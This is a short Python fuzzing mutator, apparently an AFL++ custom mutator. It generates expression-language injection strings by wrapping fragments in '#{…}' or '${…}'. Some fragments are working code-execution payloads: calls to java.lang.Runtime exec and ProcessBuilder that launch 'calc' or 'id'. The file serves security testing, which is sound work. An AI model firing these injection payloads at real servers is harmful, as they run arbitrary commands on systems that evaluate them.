import random

PREFIXES = ["#{", "${"]
SUFFIXES = ["}"]

EXPRESSION_FRAGMENTS = [
    "T(java.lang.Runtime).getRuntime().exec('calc')",
    "new java.lang.ProcessBuilder('id').start()",
    "1 + 1",
    "user.name",
    "systemProperties['os.name']",
    "#this.getClass().forName('java.lang.Runtime')"
]

def init(seed):
    random.seed(seed)

def fuzz(buf, add_buf, max_size):
    prefix = random.choice(PREFIXES)
    suffix = random.choice(SUFFIXES)
    fragment = random.choice(EXPRESSION_FRAGMENTS)
    
    payload = f"{prefix}{fragment}{suffix}".encode("utf-8")
    return bytearray(payload[:max_size])

def deinit():
    pass
